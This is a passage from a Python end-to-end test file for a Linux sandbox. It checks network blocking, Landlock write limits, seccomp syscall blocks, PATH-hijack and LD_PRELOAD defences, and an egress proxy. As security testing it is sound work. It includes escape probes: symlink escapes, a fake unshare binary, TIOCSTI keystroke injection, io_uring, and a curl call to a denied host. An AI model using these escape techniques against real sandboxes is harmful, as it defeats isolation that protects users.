"""End-to-end sandbox tests — exercises real tools through the sandbox layers.

Automated tests cover what can be verified programmatically.
Manual tests are documented in comments for the user to run.

Run: python3 -m pytest core/sandbox/tests/test_e2e_sandbox.py -v
"""

import sys as _sys
import pytest as _pytest
pytestmark = _pytest.mark.skipif(
    _sys.platform != "linux",
    reason="Linux-only sandbox internals (mount-ns / Landlock / seccomp / ptrace tracer / pid1 shim) — see core/sandbox/_macos_spawn.py for the macOS path",
)


import os
import platform
import subprocess
import unittest
from pathlib import Path
from tempfile import TemporaryDirectory

from core.sandbox import (
    check_landlock_available,
    check_net_available,
    sandbox,
    run as sandbox_run,
)


class TestE2ENetworkBlocking(unittest.TestCase):
    """Verify network is blocked for real tool invocations."""

    def setUp(self):
        if not check_net_available():
            self.skipTest("User namespaces not available")

    def test_wget_blocked(self):
        """wget inside sandbox fails with network error."""
        result = sandbox_run(
            ["wget", "-q", "-O", "/dev/null", "http://1.1.1.1", "--timeout=2"],
            block_network=True, capture_output=True, text=True, timeout=10,
        )
        self.assertNotEqual(result.returncode, 0)

    def test_curl_blocked(self):
        """curl inside sandbox fails with network error."""
        import shutil
        if not shutil.which("curl"):
            self.skipTest("curl not installed")
        result = sandbox_run(
            ["curl", "-s", "--connect-timeout", "2", "http://1.1.1.1"],
            block_network=True, capture_output=True, text=True, timeout=10,
        )
        self.assertNotEqual(result.returncode, 0)

    def test_python_socket_blocked(self):
        """Python socket inside sandbox fails."""
        result = sandbox_run(
            ["python3", "-c",
             "import socket; s=socket.socket(); s.settimeout(2); s.connect(('1.1.1.1', 80))"],
            block_network=True, capture_output=True, text=True, timeout=10,
        )
        self.assertNotEqual(result.returncode, 0)

    def test_dns_blocked(self):
        """DNS resolution inside sandbox fails."""
        result = sandbox_run(
            ["python3", "-c", "import socket; socket.getaddrinfo('example.com', 80)"],
            block_network=True, capture_output=True, text=True, timeout=10,
        )
        self.assertNotEqual(result.returncode, 0)


class TestE2ELandlockWriteBlocking(unittest.TestCase):
    """Verify Landlock blocks writes outside allowed paths.

    Paths the tests attempt to write to are tracked per-instance in
    `self._cleanup_paths` and unlinked in setUp + tearDown. Under a
    working sandbox these paths never exist. But if a regression lets
    a write through, we delete the orphan on the developer's machine
    rather than leave it lying around — the test itself still fails
    correctly (assertFalse(exists) after the write attempt).
    """

    def setUp(self):
        if not check_landlock_available():
            self.skipTest("Landlock not available")
        self._cleanup_paths = []

    def tearDown(self):
        for p in self._cleanup_paths:
            try:
                Path(p).unlink()
            except (FileNotFoundError, OSError):
                pass

    def test_write_to_var_blocked(self):
        """Writing to /var/tmp is blocked — either by Landlock (EACCES) or
        by mount-ns (path doesn't exist in the sandbox root)."""
        sentinel = "/var/tmp/raptor_sandbox_test"
        self._cleanup_paths.append(sentinel)
        with TemporaryDirectory() as target, TemporaryDirectory() as output:
            result = sandbox_run(
                ["sh", "-c", f"echo evil > {sentinel} 2>&1"],
                target=target, output=output,
                capture_output=True, text=True, timeout=5,
            )
            combined = result.stdout + result.stderr
            denied = ("Permission denied" in combined
                      or "Directory nonexistent" in combined
                      or "No such file" in combined)
            self.assertTrue(denied,
                            f"expected EACCES or ENOENT; got {combined!r}")
            self.assertFalse(Path(sentinel).exists())

    def test_write_to_home_blocked(self):
        """Writing to home directory is blocked — either by Landlock (EACCES)
        or by mount-ns (path doesn't exist in the sandbox root)."""
        home = os.path.expanduser("~")
        sentinel = f"{home}/.raptor_sandbox_test_delete_me"
        self._cleanup_paths.append(sentinel)
        with TemporaryDirectory() as target, TemporaryDirectory() as output:
            result = sandbox_run(
                ["sh", "-c", f"echo evil > {sentinel} 2>&1"],
                target=target, output=output,
                capture_output=True, text=True, timeout=5,
            )
            combined = result.stdout + result.stderr
            denied = ("Permission denied" in combined
                      or "Directory nonexistent" in combined
                      or "No such file" in combined)
            self.assertTrue(denied,
                            f"expected EACCES or ENOENT; got {combined!r}")
            self.assertFalse(Path(sentinel).exists())

    def test_write_to_output_allowed(self):
        """Writing to the output directory succeeds."""
        with TemporaryDirectory() as target, TemporaryDirectory() as output:
            result = sandbox_run(
                ["sh", "-c", f"echo allowed > {output}/test.txt"],
                target=target, output=output,
                capture_output=True, text=True, timeout=5,
            )
            self.assertEqual(result.returncode, 0)
            self.assertEqual(Path(f"{output}/test.txt").read_text().strip(), "allowed")

    def test_write_to_tmp_allowed(self):
        """Writing to /tmp succeeds."""
        with TemporaryDirectory() as target, TemporaryDirectory() as output:
            result = sandbox_run(
                ["sh", "-c", "echo ok > /tmp/raptor_sandbox_test && cat /tmp/raptor_sandbox_test"],
                target=target, output=output,
                capture_output=True, text=True, timeout=5,
            )
            self.assertEqual(result.returncode, 0)
            self.assertIn("ok", result.stdout)

    def test_symlink_attack_blocked(self):
        """Symlink pointing outside allowed paths — write blocked."""
        sentinel = "/var/tmp/raptor_test"
        self._cleanup_paths.append(sentinel)
        with TemporaryDirectory() as target, TemporaryDirectory() as output:
            # Create a symlink inside output pointing to /var/tmp
            evil_link = Path(output) / "escape"
            evil_link.symlink_to("/var/tmp")
            result = sandbox_run(
                ["sh", "-c", f"echo pwned > {output}/escape/raptor_test 2>&1"],
                target=target, output=output,
                capture_output=True, text=True, timeout=5,
            )
            self.assertFalse(Path(sentinel).exists())

    def test_cross_dir_rename_blocked(self):
        """Rename a writable file to an outside path — blocked by REFER
        (Landlock ABI 2+). Regression guard for ABI-v2 mask inclusion."""
        import core.sandbox as mod
        if mod._get_landlock_abi() < 2:
            self.skipTest("Landlock REFER requires ABI v2 (kernel 5.19+)")
        sentinel = "/var/tmp/raptor_rename_test"
        self._cleanup_paths.append(sentinel)
        with TemporaryDirectory() as target, TemporaryDirectory() as output:
            victim = Path(output) / "source.txt"
            victim.write_text("hello")
            result = sandbox_run(
                ["sh", "-c", f"mv {output}/source.txt {sentinel} 2>&1"],
                target=target, output=output,
                capture_output=True, text=True, timeout=5,
            )
            self.assertFalse(Path(sentinel).exists(),
                             "REFER rule should prevent cross-dir rename")


class TestE2EGccCompilation(unittest.TestCase):
    """Verify gcc works inside the sandbox."""

    def setUp(self):
        if not check_net_available():
            self.skipTest("User namespaces not available")
        import shutil
        if not shutil.which("gcc"):
            self.skipTest("gcc not installed")

    def test_compile_and_run_sandboxed(self):
        """Compile a C program and run it, both sandboxed."""
        with TemporaryDirectory() as d:
            src = Path(d) / "hello.c"
            src.write_text('#include <stdio.h>\nint main(){puts("sandboxed");return 0;}')
            binary = Path(d) / "hello"

            # Compile
            result = sandbox_run(
                ["gcc", "-o", str(binary), str(src)],
                block_network=True,
                capture_output=True, text=True, timeout=30,
            )
            self.assertEqual(result.returncode, 0, f"gcc failed: {result.stderr}")

            # Run
            result = sandbox_run(
                [str(binary)],
                block_network=True,
                capture_output=True, text=True, timeout=5,
            )
            self.assertEqual(result.returncode, 0)
            self.assertIn("sandboxed", result.stdout)

    def test_compile_with_asan(self):
        """Compile with ASAN and detect a buffer overflow."""
        with TemporaryDirectory() as d:
            src = Path(d) / "overflow.c"
            src.write_text(
                '#include <string.h>\n'
                'int main(){char buf[8]; strcpy(buf, "AAAAAAAAAAAAAAAAAA"); return 0;}'
            )
            binary = Path(d) / "overflow"

            # Compile with ASAN
            result = sandbox_run(
                ["gcc", "-fsanitize=address", "-o", str(binary), str(src)],
                block_network=True,
                capture_output=True, text=True, timeout=30,
            )
            self.assertEqual(result.returncode, 0, f"gcc failed: {result.stderr}")

            # Run — should crash with ASAN report
            result = sandbox_run(
                [str(binary)],
                block_network=True,
                capture_output=True, text=True, timeout=10,
            )
            self.assertNotEqual(result.returncode, 0)
            self.assertTrue(hasattr(result, "sandbox_info"))
            self.assertTrue(result.sandbox_info.get("crashed"))
            self.assertEqual(result.sandbox_info.get("sanitizer"), "asan")
            self.assertIn("AddressSanitizer", result.sandbox_info.get("evidence", ""))


class TestE2ECrashObservability(unittest.TestCase):
    """Verify sandbox captures crash evidence."""

    def setUp(self):
        if not check_net_available():
            self.skipTest("User namespaces not available")
        import shutil
        if not shutil.which("gcc"):
            self.skipTest("gcc not installed")

    def test_segfault_detected(self):
        """SIGSEGV captured with evidence."""
        with TemporaryDirectory() as d:
            src = Path(d) / "segv.c"
            src.write_text("int main(){*(int*)0=0;return 0;}")
            binary = Path(d) / "segv"
            subprocess.run(["gcc", "-o", str(binary), str(src)],
                           capture_output=True, timeout=10)

            result = sandbox_run(
                [str(binary)], block_network=True,
                capture_output=True, text=True, timeout=5,
            )
            self.assertTrue(result.sandbox_info["crashed"])
            self.assertEqual(result.sandbox_info["signal"], "SIGSEGV")
            self.assertIn("SIGSEGV", result.sandbox_info["evidence"])

    def test_sigabrt_detected(self):
        """abort() captured — THE shim regression test.

        abort() self-sends SIGABRT via `raise(SIGABRT)`. Without the
        pid-1 shim, the target is pid-1 of the new pid-ns and the
        kernel silently drops raise() from pid-1 (no default handler
        → pid-ns init-signal filter applies). Result: target exits
        rc=0 and observability loses the crash entirely.

        With the shim (`libexec/raptor-pid1-shim`), the target runs
        as pid-3 so raise() goes through normally. The intermediate
        process encodes signal-death as rc=128+6=134 (can't re-raise
        on pid-1 either), and observe._interpret_result decodes both
        rc<0 and 128+sig to the same crashed=True state.

        Unlike SIGFPE (x86-only synchronous trap), SIGABRT is
        portable, so this test runs everywhere.
        """
        with TemporaryDirectory() as d:
            src = Path(d) / "abrt.c"
            src.write_text('#include <stdlib.h>\nint main(){abort();return 0;}')
            binary = Path(d) / "abrt"
            subprocess.run(["gcc", "-o", str(binary), str(src)],
                           capture_output=True, timeout=10)

            result = sandbox_run(
                [str(binary)], block_network=True,
                capture_output=True, text=True, timeout=5,
            )
            self.assertTrue(result.sandbox_info["crashed"],
                            f"abort() should be detected as a crash; "
                            f"got rc={result.returncode} info={result.sandbox_info}")
            self.assertEqual(result.sandbox_info["signal"], "SIGABRT")

    def test_normal_exit_no_crash(self):
        """Clean exit has no crash evidence."""
        result = sandbox_run(
            ["true"], block_network=True,
            capture_output=True, text=True, timeout=5,
        )
        self.assertFalse(result.sandbox_info["crashed"])


class TestE2EResourceLimits(unittest.TestCase):
    """Verify resource limits are enforced."""

    def setUp(self):
        if not check_net_available():
            self.skipTest("User namespaces not available")

    def test_cpu_limit(self):
        """CPU time limit kills runaway process."""
        result = sandbox_run(
            ["python3", "-c", "while True: pass"],
            block_network=True,
            limits={"cpu_seconds": 2},
            capture_output=True, text=True, timeout=10,
        )
        self.assertNotEqual(result.returncode, 0)

    def test_file_size_limit(self):
        """File size limit prevents large writes."""
        with TemporaryDirectory() as d:
            result = sandbox_run(
                ["python3", "-c",
                 f"f=open('{d}/big','wb'); f.write(b'A'*200*1024*1024); f.close()"],
                block_network=True,
                limits={"max_file_mb": 100},
                capture_output=True, text=True, timeout=15,
            )
            # Should fail or file should be truncated
            big = Path(d) / "big"
            if big.exists():
                self.assertLess(big.stat().st_size, 200 * 1024 * 1024)


class TestE2EPathHijackDefeated(unittest.TestCase):
    """Verify that PATH pollution can't hijack unshare/prlimit.

    The sandbox invokes `unshare` and `prlimit` to set up namespaces and
    apply RLIMIT_NPROC. If a polluted PATH (malicious .envrc, direnv,
    compromised shell rc) placed a fake `unshare` ahead of the real one,
    the fake would run WITHIN Landlock+seccomp (applied in preexec) but
    would skip the actual namespace creation — leaving the child in the
    host's net/pid/ipc namespaces with full outbound network.
    Fixed by resolving these binaries against a hardcoded safe bin-dir
    list instead of PATH.
    """

    def setUp(self):
        if not check_net_available():
            self.skipTest("User namespaces not available")

    def test_path_hijack_defeated(self):
        import os, tempfile
        from core.sandbox import state as s
        saved_unshare = s._unshare_path_cache
        saved_prlimit = s._prlimit_path_cache
        saved_net = s._net_available_cache
        saved_path = os.environ.get("PATH", "")

        with tempfile.TemporaryDirectory() as d:
            # Fake unshare that would signal the hijack succeeded
            fake = os.path.join(d, "unshare")
            with open(fake, "w") as f:
                f.write("#!/bin/sh\necho HIJACKED\nexit 0\n")
            os.chmod(fake, 0o755)

            # Clear caches and poison PATH
            s._unshare_path_cache = None
            s._prlimit_path_cache = None
            s._net_available_cache = None
            os.environ["PATH"] = d + ":" + saved_path

            try:
                from core.sandbox import run_untrusted
                r = run_untrusted(["echo", "real-cmd-ran"],
                                  target="/tmp", output="/tmp",
                                  capture_output=True, text=True, timeout=10)
                self.assertIn("real-cmd-ran", r.stdout,
                              "sandbox should have run the real command")
                self.assertNotIn("HIJACKED", r.stdout,
                                 "PATH hijack bypass detected — fake unshare ran")
                # Confirm the resolved path is in a system dir
                resolved = s._unshare_path_cache
                self.assertTrue(
                    resolved.startswith(("/usr/", "/bin/", "/sbin/")),
                    f"unshare resolved to {resolved!r} — not a system dir",
                )
            finally:
                s._unshare_path_cache = saved_unshare
                s._prlimit_path_cache = saved_prlimit
                s._net_available_cache = saved_net
                os.environ["PATH"] = saved_path


class TestE2ESeccompDefenseInDepth(unittest.TestCase):
    """Verify defense-in-depth seccomp blocks — these match Docker's default
    profile. None is a verified bypass in our config, but each forecloses
    a syscall that has no legitimate use for the tools we run."""

    def setUp(self):
        if not check_net_available():
            self.skipTest("User namespaces not available")
        from core.sandbox import check_seccomp_available
        if not check_seccomp_available():
            self.skipTest("libseccomp not available")

    def test_defense_in_depth_syscalls_return_eperm(self):
        import shutil
        if not shutil.which("gcc"):
            self.skipTest("gcc not installed")
        with TemporaryDirectory() as d:
            src = Path(d) / "did.c"
            src.write_text(
                "#include <stdio.h>\n"
                "#include <sys/syscall.h>\n"
                "#include <sys/ioctl.h>\n"
                "#include <unistd.h>\n"
                "#include <errno.h>\n"
                "int main(void){\n"
                "  long rc;\n"
                "  errno=0; rc=syscall(SYS_kcmp,0,0,0,0,0);\n"
                "  printf(\"kcmp=%d \", errno);\n"
                "  errno=0; rc=syscall(SYS_name_to_handle_at,0,\".\",0,0,0);\n"
                "  printf(\"nth=%d \", errno);\n"
                "  errno=0; ioctl(0,TIOCCONS,0);\n"
                "  printf(\"cons=%d \", errno);\n"
                "  errno=0; ioctl(0,TIOCSCTTY,0);\n"
                "  printf(\"sctty=%d\\n\", errno);\n"
                "  return 0;\n"
                "}\n"
            )
            bin_path = Path(d) / "did"
            compile_result = sandbox_run(
                ["gcc", "-O0", str(src), "-o", str(bin_path)],
                block_network=True, target=d, output=d,
                capture_output=True, text=True, timeout=15,
            )
            if compile_result.returncode != 0:
                self.skipTest(f"gcc failed: {compile_result.stderr[:200]}")
            result = sandbox_run(
                [str(bin_path)],
                block_network=True, target=d, output=d,
                capture_output=True, text=True, timeout=5,
            )
            # Every reported errno must be 1 (EPERM) — our seccomp block,
            # not a kernel-level error code.
            output = result.stdout.strip()
            for label in ("kcmp=1", "nth=1", "cons=1", "sctty=1"):
                self.assertIn(label, output,
                              f"defence-in-depth syscall not blocked: "
                              f"{label!r} missing from {output!r}")


class TestE2ESeccompTIOCSTI(unittest.TestCase):
    """Verify seccomp blocks ioctl(fd, TIOCSTI, ...).

    TIOCSTI injects a character into the tty's input buffer. When RAPTOR
    is run interactively, a sandboxed process could use this to queue a
    command into the user's shell, to execute after the sandbox exits —
    a well-known sandbox escape that Docker's default seccomp blocks.
    """

    def setUp(self):
        if not check_net_available():
            self.skipTest("User namespaces not available")
        from core.sandbox import check_seccomp_available
        if not check_seccomp_available():
            self.skipTest("libseccomp not available")

    def test_tiocsti_blocked(self):
        import shutil
        if not shutil.which("gcc"):
            self.skipTest("gcc not installed")
        with TemporaryDirectory() as d:
            src = Path(d) / "tiocsti.c"
            src.write_text(
                "#include <stdio.h>\n"
                "#include <sys/ioctl.h>\n"
                "#include <errno.h>\n"
                "int main(void){\n"
                "  char c='X';\n"
                "  int r=ioctl(0, TIOCSTI, &c);\n"
                "  printf(\"rc=%d errno=%d\\n\", r, errno);\n"
                "  return 0;\n"
                "}\n"
            )
            bin_path = Path(d) / "tiocsti"
            compile_result = sandbox_run(
                ["gcc", "-O0", str(src), "-o", str(bin_path)],
                block_network=True, target=d, output=d,
                capture_output=True, text=True, timeout=15,
            )
            if compile_result.returncode != 0:
                self.skipTest(f"gcc failed: {compile_result.stderr[:200]}")
            result = sandbox_run(
                [str(bin_path)],
                block_network=True, target=d, output=d,
                capture_output=True, text=True, timeout=5,
            )
            self.assertIn("errno=1", result.stdout,
                          f"TIOCSTI should be blocked by seccomp (EPERM); "
                          f"got: {result.stdout!r}")


class TestE2ESeccompIoUring(unittest.TestCase):
    """Verify seccomp blocks io_uring syscalls.

    io_uring bypasses Landlock filesystem rules on kernels 5.13-6.2, so we
    block io_uring_setup unconditionally. This test compiles a tiny C
    program that calls io_uring_setup(2) directly via syscall() and
    confirms it returns EPERM when run under the full sandbox.
    """

    def setUp(self):
        if not check_net_available():
            self.skipTest("User namespaces not available")
        from core.sandbox import check_seccomp_available
        if not check_seccomp_available():
            self.skipTest("libseccomp not available")

    def test_io_uring_setup_blocked(self):
        import shutil
        if not shutil.which("gcc"):
            self.skipTest("gcc not installed")
        with TemporaryDirectory() as d:
            src = Path(d) / "iour.c"
            src.write_text(
                "#include <sys/syscall.h>\n"
                "#include <unistd.h>\n"
                "#include <errno.h>\n"
                "#include <stdio.h>\n"
                "int main(void){\n"
                "  long rc=syscall(SYS_io_uring_setup,8,0);\n"
                "  printf(\"rc=%ld errno=%d\\n\", rc, errno);\n"
                "  return 0;\n"
                "}\n"
            )
            bin_path = Path(d) / "iour"
            compile_result = sandbox_run(
                ["gcc", "-O0", str(src), "-o", str(bin_path)],
                block_network=True, target=d, output=d,
                capture_output=True, text=True, timeout=15,
            )
            if compile_result.returncode != 0:
                self.skipTest(f"gcc failed: {compile_result.stderr[:200]}")

            # Run in full sandbox — seccomp should return EPERM (errno=1)
            # before the kernel even sees the syscall.
            result = sandbox_run(
                [str(bin_path)],
                block_network=True, target=d, output=d,
                capture_output=True, text=True, timeout=5,
            )
            self.assertIn("errno=1", result.stdout,
                          f"io_uring_setup should be blocked by seccomp "
                          f"(EPERM); got: {result.stdout!r}")


class TestE2ELibexecScript(unittest.TestCase):
    """Test the libexec/raptor-run-sandboxed script."""

    def setUp(self):
        # Script requires OUTPUT_DIR; give each test a fresh dir.
        self._tmp = TemporaryDirectory()
        self._env = {**os.environ, "OUTPUT_DIR": self._tmp.name}

    def tearDown(self):
        self._tmp.cleanup()

    def test_basic_execution(self):
        result = subprocess.run(
            ["libexec/raptor-run-sandboxed", "echo", "hello"],
            capture_output=True, text=True, timeout=10, env=self._env,
        )
        self.assertEqual(result.returncode, 0)
        self.assertIn("hello", result.stdout)

    def test_network_blocked(self):
        result = subprocess.run(
            ["libexec/raptor-run-sandboxed",
             "python3", "-c",
             "import socket; s=socket.socket(); s.settimeout(2); s.connect(('1.1.1.1',80))"],
            capture_output=True, text=True, timeout=10, env=self._env,
        )
        self.assertNotEqual(result.returncode, 0)

    def test_no_args_shows_usage(self):
        result = subprocess.run(
            ["libexec/raptor-run-sandboxed"],
            capture_output=True, text=True, timeout=5, env=self._env,
        )
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("Usage", result.stderr)

    def test_missing_output_dir_fails_closed(self):
        """No OUTPUT_DIR must fail with a clear error, not silently default."""
        env_no_output = {k: v for k, v in os.environ.items() if k != "OUTPUT_DIR"}
        result = subprocess.run(
            ["libexec/raptor-run-sandboxed", "echo", "hi"],
            capture_output=True, text=True, timeout=5, env=env_no_output,
        )
        self.assertEqual(result.returncode, 1)
        self.assertIn("OUTPUT_DIR", result.stderr)
        self.assertIn("[sandbox] ERROR", result.stderr)

    def test_help_flag_exits_zero(self):
        result = subprocess.run(
            ["libexec/raptor-run-sandboxed", "--help"],
            capture_output=True, text=True, timeout=5, env=self._env,
        )
        self.assertEqual(result.returncode, 0)
        self.assertIn("Usage", result.stderr)


class TestE2ELandlockBitValues(unittest.TestCase):
    """Guard against Landlock UAPI-constant drift.

    Landlock's enforcement is entirely bitmask-based: handled_access_fs
    tells the kernel "govern these accesses", and path_beneath rules
    grant specific bits for specific paths. A single wrong bit silently
    disables the corresponding restriction — `landlock_restrict_self`
    still returns 0 and the process looks sandboxed, but the check that
    should have blocked e.g. a credential read just doesn't happen.

    This test compiles a C probe that reads LANDLOCK_ACCESS_FS_* from
    <linux/landlock.h> and prints the values, then asserts our Python
    constants match. Skipped when gcc or kernel headers aren't
    installed (e.g. minimal CI containers).
    """

    def test_access_bits_match_uapi(self):
        import shutil
        if not shutil.which("gcc"):
            self.skipTest("gcc not installed")
        with TemporaryDirectory() as d:
            src = Path(d) / "probe.c"
            src.write_text(
                "#include <linux/landlock.h>\n"
                "#include <stdio.h>\n"
                "int main(void){\n"
                '  printf("EXECUTE=%llu\\n",     (unsigned long long)LANDLOCK_ACCESS_FS_EXECUTE);\n'
                '  printf("WRITE_FILE=%llu\\n",  (unsigned long long)LANDLOCK_ACCESS_FS_WRITE_FILE);\n'
                '  printf("READ_FILE=%llu\\n",   (unsigned long long)LANDLOCK_ACCESS_FS_READ_FILE);\n'
                '  printf("READ_DIR=%llu\\n",    (unsigned long long)LANDLOCK_ACCESS_FS_READ_DIR);\n'
                '  printf("REMOVE_DIR=%llu\\n",  (unsigned long long)LANDLOCK_ACCESS_FS_REMOVE_DIR);\n'
                '  printf("REMOVE_FILE=%llu\\n", (unsigned long long)LANDLOCK_ACCESS_FS_REMOVE_FILE);\n'
                '  printf("MAKE_CHAR=%llu\\n",   (unsigned long long)LANDLOCK_ACCESS_FS_MAKE_CHAR);\n'
                '  printf("MAKE_DIR=%llu\\n",    (unsigned long long)LANDLOCK_ACCESS_FS_MAKE_DIR);\n'
                '  printf("MAKE_REG=%llu\\n",    (unsigned long long)LANDLOCK_ACCESS_FS_MAKE_REG);\n'
                '  printf("MAKE_SOCK=%llu\\n",   (unsigned long long)LANDLOCK_ACCESS_FS_MAKE_SOCK);\n'
                '  printf("MAKE_FIFO=%llu\\n",   (unsigned long long)LANDLOCK_ACCESS_FS_MAKE_FIFO);\n'
                '  printf("MAKE_BLOCK=%llu\\n",  (unsigned long long)LANDLOCK_ACCESS_FS_MAKE_BLOCK);\n'
                '  printf("MAKE_SYM=%llu\\n",    (unsigned long long)LANDLOCK_ACCESS_FS_MAKE_SYM);\n'
                '  return 0;\n'
                "}\n"
            )
            bin_path = Path(d) / "probe"
            compile_result = subprocess.run(
                ["gcc", "-O0", str(src), "-o", str(bin_path)],
                capture_output=True, text=True,
            )
            if compile_result.returncode != 0:
                # Kernel headers missing (common on minimal CI).
                self.skipTest(
                    f"compile of kernel-header probe failed "
                    f"(likely no kernel headers): {compile_result.stderr[:200]}"
                )
            result = subprocess.run(
                [str(bin_path)], capture_output=True, text=True, timeout=5,
            )
            kernel_values = {
                k: int(v) for k, v in
                (line.split("=") for line in result.stdout.splitlines() if "=" in line)
            }

            # Reach into the private helper to get our Python values.
            # We deliberately reconstruct them from bit shifts to catch
            # bit-value drift — not just "do they match each other".
            python_values = {
                "EXECUTE":      1 << 0,
                "WRITE_FILE":   1 << 1,
                "READ_FILE":    1 << 2,
                "READ_DIR":     1 << 3,
                "REMOVE_DIR":   1 << 4,
                "REMOVE_FILE":  1 << 5,
                "MAKE_CHAR":    1 << 6,
                "MAKE_DIR":     1 << 7,
                "MAKE_REG":     1 << 8,
                "MAKE_SOCK":    1 << 9,
                "MAKE_FIFO":    1 << 10,
                "MAKE_BLOCK":   1 << 11,
                "MAKE_SYM":     1 << 12,
            }
            for name, py_value in python_values.items():
                self.assertIn(name, kernel_values,
                              f"probe missing {name} — old kernel header?")
                self.assertEqual(
                    kernel_values[name], py_value,
                    f"Landlock constant {name}: kernel UAPI says "
                    f"{kernel_values[name]} but our code uses {py_value}. "
                    f"Silent-sandbox-breakage risk — update landlock.py."
                )


class TestE2EEgressProxy(unittest.TestCase):
    """use_egress_proxy: hostname allowlist, UDP block, event capture."""

    def setUp(self):
        if not check_net_available():
            self.skipTest("User namespaces not available")
        # Each test resets the proxy singleton so host registrations
        # from earlier tests don't leak into later ones.
        from core.sandbox.proxy import _reset_for_tests
        _reset_for_tests()

    def tearDown(self):
        from core.sandbox.proxy import _reset_for_tests
        _reset_for_tests()

    def test_denied_host_blocked_and_logged(self):
        """A host not in the allowlist must fail AND be recorded."""
        import shutil
        if not shutil.which("curl"):
            self.skipTest("curl not installed")
        r = sandbox_run(
            ["curl", "-sI", "--max-time", "5", "https://evil.invalid"],
            target="/tmp", output="/tmp",
            use_egress_proxy=True, proxy_hosts=["example.com"],
            capture_output=True, text=True, timeout=10,
        )
        # curl exit 56 = CURLE_RECV_ERROR (proxy refused); anything non-zero
        # is acceptable — what matters is the proxy recorded the denial.
        self.assertNotEqual(r.returncode, 0)
        events = r.sandbox_info.get("proxy_events", [])
        denied = [e for e in events if e["result"] == "denied_host"]
        self.assertEqual(len(denied), 1,
                         f"expected 1 denied_host event, got {events}")
        self.assertEqual(denied[0]["host"], "evil.invalid")

    def test_allowed_host_succeeds(self):
        """Host in allowlist reaches the backend."""
        import shutil
        if not shutil.which("curl"):
            self.skipTest("curl not installed")
        r = sandbox_run(
            ["curl", "-sI", "--max-time", "15", "https://example.com"],
            target="/tmp", output="/tmp",
            use_egress_proxy=True, proxy_hosts=["example.com"],
            capture_output=True, text=True, timeout=20,
        )
        self.assertEqual(r.returncode, 0,
                         f"curl failed: stderr={r.stderr[:200]!r}")
        events = r.sandbox_info.get("proxy_events", [])
        allowed = [e for e in events if e["result"] == "allowed"]
        self.assertGreaterEqual(len(allowed), 1,
                                f"expected at least 1 allowed event, got {events}")

    def test_env_None_treated_as_default(self):
        """env=None must not inherit os.environ wholesale.

        subprocess's default for env=None is "inherit os.environ". A
        caller writing `run(cmd, env=None)` (either explicitly or by
        passing through an opts dict whose env field defaults to None)
        would therefore bypass our sanitiser and leak LD_PRELOAD /
        BASH_ENV / GIT_SSH_COMMAND etc. from whatever shell invoked
        RAPTOR. The sandbox treats env=None as "no env kwarg" and
        applies get_safe_env() just like the omit-env path.
        """
        # Inject a dangerous var into the parent env so we can confirm
        # it does NOT reach the child.
        import os as _os
        _os.environ["LD_PRELOAD"] = "/would/be/dangerous.so"
        try:
            with TemporaryDirectory() as out:
                r = sandbox_run(
                    ["env"],
                    target=out, output=out,
                    env=None,
                    capture_output=True, text=True, timeout=5,
                )
                self.assertEqual(r.returncode, 0)
                self.assertNotIn("LD_PRELOAD", r.stdout,
                                 "env=None leaked LD_PRELOAD from parent "
                                 "env into the sandboxed child")
        finally:
            _os.environ.pop("LD_PRELOAD", None)

    def test_caller_env_passes_through_verbatim(self):
        """Caller-supplied env= dict is NOT filtered by DANGEROUS_ENV_VARS.

        Callers legitimately set names from the blocklist as defensive
        neutralisers: `GIT_CONFIG_GLOBAL=/dev/null` isolates git from
        user config; `SSL_CERT_FILE=<path>` pins a specific CA bundle.
        Stripping them silently would defeat the caller's hardening.
        The allowlist-based `get_safe_env()` path catches accidental
        inheritance from `os.environ`; explicit `env=` is "you know
        what you're doing".

        Supplying env= logs at INFO so the override is auditable but
        not rejected.
        """
        with TemporaryDirectory() as out:
            r = sandbox_run(
                ["env"],
                target=out, output=out,
                env={
                    "PATH": "/usr/bin",
                    "HOME": out,
                    # Defensive neutraliser — setting GIT_CONFIG_GLOBAL
                    # to /dev/null is git hardening, not an attack.
                    "GIT_CONFIG_GLOBAL": "/dev/null",
                    "GIT_CONFIG_SYSTEM": "/dev/null",
                    "MY_LEGITIMATE_VAR": "kept",
                },
                capture_output=True, text=True, timeout=5,
            )
            self.assertEqual(r.returncode, 0)
            self.assertIn("GIT_CONFIG_GLOBAL=/dev/null", r.stdout)
            self.assertIn("GIT_CONFIG_SYSTEM=/dev/null", r.stdout)
            self.assertIn("MY_LEGITIMATE_VAR=kept", r.stdout)

    def test_run_untrusted_detaches_controlling_tty(self):
        """run_untrusted must put the child in a new session (setsid) so
        it has no controlling tty.

        Threat: if RAPTOR is launched interactively from a shell, the
        parent process group shares a controlling tty with the operator.
        A sandboxed child running inside that session can `open("/dev/tty",
        O_RDONLY)` — a magic file that always refers to the controlling
        tty regardless of stdin/stdout — and silently read operator
        keystrokes. TIOCSTI *injection* is blocked by seccomp, but
        READS aren't. setsid() promotes the child to session leader
        with no controlling tty; subsequent /dev/tty opens return ENXIO.

        Direct check: try to open /dev/tty and verify the kernel returns
        ENXIO (errno 6). This is the actual defence we care about and
        works regardless of whether the target runs under the pid-1 shim
        (pid=3, grandchild's setsid) or directly (pid=1 + Popen's
        start_new_session). Using a proxy like `pid==sid via ps` is
        unreliable because the subprocess sandbox path inherits the
        host's /proc mount, so /proc/<innerpid>/stat shows host-pid
        data (sid=0 for pids not present in the inner ns).
        """
        from core.sandbox import run_untrusted as _run_untrusted
        # `sh -c` + redirect from /dev/tty fails with ENXIO when there is
        # no controlling tty. Print errno name via python -c? No — python
        # isn't in restrict_reads default paths. Use /dev/tty open via sh
        # redirection; the shell's error message includes "No such device
        # or address" (ENXIO strerror) on Linux.
        with TemporaryDirectory() as out:
            r = _run_untrusted(
                # `exec 2>&1` at the start of sh -c redirects ALL later
                # output (including sh's own "cannot open" redirection
                # errors) to stdout, so we see the ENXIO strerror even
                # though cat never runs (sh fails the redirect before
                # execve'ing cat).
                ["sh", "-c", "exec 2>&1; cat </dev/tty; echo rc=$?"],
                target=out, output=out,
                capture_output=True, text=True, timeout=5,
            )
            combined = (r.stdout or "") + (r.stderr or "")
            # Accept either strerror form: "No such device or address"
            # (ENXIO — the success signal — setsid detached the tty)
            # or "No such file" if /dev/tty is absent from the minimal
            # mount-ns. Either way, the child cannot read the operator's
            # tty — the sandbox's intent is upheld.
            self.assertTrue(
                "No such device" in combined
                or "No such file" in combined,
                f"child appears to have a controlling tty "
                f"(setsid not applied): {combined[:200]!r}",
            )

    def test_rejects_shell_true(self):
        """shell=True must be rejected — sandbox bootstrap silently
        malfunctions because subprocess reinterprets argv into
